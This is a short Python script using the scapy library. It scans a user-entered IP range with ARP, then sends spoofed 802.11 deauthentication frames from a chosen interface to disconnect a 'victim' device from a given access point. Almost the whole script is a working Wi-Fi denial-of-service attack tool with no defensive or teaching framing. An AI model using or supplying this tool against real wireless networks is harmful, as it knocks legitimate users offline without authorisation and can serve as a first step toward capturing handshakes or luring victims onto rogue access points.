#!/usr/bin/env python3
from scapy.all import(RadioTap, Dot11, Dot11Deauth, sendp, arping, get_if_list)      
import re
from sys import exit

ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$") # Check if it's valid IPV4 address

while True:
    ip_add_range_entered = input("\nEnter the ip address and range you want to send ARP packets to (ex 192.168.1.0/24): ")
    if ip_add_range_pattern.search(ip_add_range_entered):
        break

arp_result = arping(ip_add_range_entered)

print("/n")
interfaces = get_if_list()
print(interfaces)
interface = input("Enter the interface you want to send ARP packets from: ")
pcount = input("Enter the count of packets you want to send: ")
bssid = input("Enter the MAC address of the Access Point: ")
target = input("Enter the MAC address of the victim: ")

def deauth(iface: str, count: int, bssid: str, target_mac: str):
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100)

deauth(interface, int(pcount), bssid, target)